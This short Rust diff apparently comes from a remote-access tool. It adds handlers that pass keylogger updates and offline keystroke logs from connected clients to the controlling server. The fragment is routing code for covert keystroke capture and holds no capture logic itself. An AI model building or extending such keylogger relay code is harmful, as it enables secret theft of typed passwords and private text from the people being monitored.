@@ -185,6 +185,16 @@ impl ClientReaderWrapper {
                     .await;
             }
 
+            KeyloggerUpdate(update) => {
+                self.send_server_packet(ServerCommand::KeyloggerUpdate(self.addr, update))
+                    .await;
+            }
+
+            KeyloggerOfflineLogs(logs) => {
+                self.send_server_packet(ServerCommand::KeyloggerOfflineLogs(self.addr, logs))
+                    .await;
+            }
+
             EncryptionConfirm(_, _) => {
                 println!("Received unexpected EncryptionConfirm packet");
             }
